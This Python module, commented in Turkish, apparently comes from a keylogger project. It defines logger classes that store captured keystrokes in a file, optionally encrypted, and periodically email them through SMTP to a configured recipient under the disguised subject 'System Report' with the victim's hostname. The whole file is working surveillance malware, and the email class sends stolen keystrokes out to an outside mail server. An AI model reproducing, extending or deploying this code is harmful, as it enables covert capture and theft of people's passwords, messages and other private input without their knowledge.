"""
Keylogger verilerini işleyen logger sınıfları.
"""

import os
import smtplib
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import List, Tuple
from datetime import datetime
import socket
from src.utils import encrypt_data, generate_key, get_log_path, ensure_log_directory, check_log_rotation, rotate_logs

class BaseLogger(ABC):
    """Tüm logger'lar için soyut temel sınıf."""
    
    def __init__(self, config):
        """Logger'ı başlat."""
        self.config = config
    
    @abstractmethod
    def log(self, keystrokes: List[Tuple[str, str]]):
        """
        Yakalanan tuş vuruşlarını kaydet.
        
        Parametreler:
            keystrokes: (zaman damgası, tuş vuruşu) çiftlerinin listesi
        """
        pass
    
    def format_keystrokes(self, keystrokes: List[Tuple[str, str]]) -> str:
        """Tuş vuruşlarını okunabilir bir dizeye biçimlendir."""
        result = []
        for timestamp, key in keystrokes:
            result.append(f"{timestamp}: {key}")
        return "\n".join(result)

class FileLogger(BaseLogger):
    """Tuş vuruşlarını bir dosyaya yazan logger."""
    
    def __init__(self, config):
        """
        Dosya logger'ını başlat.
        """
        super().__init__(config)
        self.log_path = get_log_path(config)
        self.encrypt = config.getboolean('Output', 'encrypt', fallback=True)
        self.password = config.get('Output', 'password', fallback='default_key')
        self.key = generate_key(self.password) if self.encrypt else None
        
        # Log dizinini oluştur
        ensure_log_directory(self.log_path)
        
        # Başlangıçta log rotasyonunu kontrol et
        rotate_logs(config, self.log_path)
    
    def log(self, keystrokes: List[Tuple[str, str]]):
        """Tuş vuruşlarını dosyaya yaz."""
        if not keystrokes:
            return
            
        # Log rotasyonunu kontrol et
        rotate_logs(self.config, self.log_path)
            
        formatted = self.format_keystrokes(keystrokes)
        
        try:
            if self.encrypt and self.key:
                # Şifrelenmiş veriyi binary modda yaz
                encrypted_data = encrypt_data(formatted, self.key)
                with open(self.log_path, 'ab') as f:
                    f.write(encrypted_data + b"\n")
            else:
                # Şifrelenmemiş veriyi metin modunda yaz
                with open(self.log_path, 'a', encoding='utf-8') as f:
                    f.write(formatted + "\n")
        except Exception as e:
            print(f"Dosyaya yazma hatası: {e}")
            
    def __del__(self):
        """Yıkıcı - kaynakları temizle."""
        try:
            # Son bir rotasyon kontrolü yap
            rotate_logs(self.config, self.log_path)
        except:
            pass

class EmailLogger(BaseLogger):
    """Tuş vuruşlarını e-posta ile gönderen logger."""
    
    def __init__(self, config):
        """E-posta logger'ını başlat."""
        super().__init__(config)
        self.enabled = config.getboolean('Email', 'email_enabled', fallback=False)
        if not self.enabled:
            return
            
        self.recipient = config.get('Email', 'recipient')
        self.smtp_server = config.get('Email', 'smtp_server')
        self.smtp_port = config.getint('Email', 'smtp_port')
        self.username = config.get('Email', 'smtp_user')
        self.password = config.get('Email', 'smtp_password')
        self.min_size = config.getint('Email', 'min_email_size', fallback=1) * 1024  # KB to bytes
        self.email_interval = config.getint('Email', 'email_interval', fallback=3600)
        self.last_email_time = datetime.now()
        self.buffer = []
    
    def log(self, keystrokes: List[Tuple[str, str]]):
        """Tuş vuruşlarını e-posta ile gönder."""
        if not self.enabled or not keystrokes:
            return
            
        # Buffer'a ekle
        self.buffer.extend(keystrokes)
        
        # Gönderme zamanı geldi mi kontrol et
        now = datetime.now()
        time_diff = (now - self.last_email_time).total_seconds()
        
        if time_diff >= self.email_interval:
            self._send_email()
    
    def _send_email(self):
        """E-postayı gönder."""
        if not self.buffer:
            return
            
        formatted = self.format_keystrokes(self.buffer)
        
        # Minimum boyut kontrolü
        if len(formatted.encode()) < self.min_size:
            return
            
        # Mesaj oluştur
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = self.recipient
        
        # Konu başlığını config'den al veya varsayılan kullan
        subject_template = self.config.get('Email', 'email_subject', fallback="Sistem Raporu - {hostname} - {datetime}")
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = socket.gethostname()
        subject = subject_template.replace("{hostname}", hostname).replace("{datetime}", current_time)
        msg['Subject'] = subject
        
        # Tuş vuruşlarını ekle
        msg.attach(MIMEText(formatted, 'plain'))
        
        # E-postayı gönder
        try:
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.username, self.password)
            server.send_message(msg)
            server.quit()
            self.last_email_time = datetime.now()
            self.buffer = []  # Buffer'ı temizle
            print(f"E-posta başarıyla gönderildi: {self.recipient}")
        except Exception as e:
            print(f"E-posta gönderme hatası: {e}")
            # Hata durumunda e-posta gönder
            if self.config.getboolean('Email', 'email_on_error', fallback=False):
                try:
                    # Acil durum e-posta adresi varsa kullan
                    emergency_email = self.config.get('Email', 'emergency_email', fallback="")
                    recipient = emergency_email if emergency_email else self.recipient
                    
                    error_msg = MIMEText(f"Hata: {str(e)}", 'plain')
                    error_msg['Subject'] = f"Sistem Raporu Hatası - {current_time}"
                    error_msg['From'] = self.username
                    error_msg['To'] = recipient
                    server = smtplib.SMTP(self.smtp_server, self.smtp_port)
                    server.starttls()
                    server.login(self.username, self.password)
                    server.send_message(error_msg)
                    server.quit()
                except:
                    pass 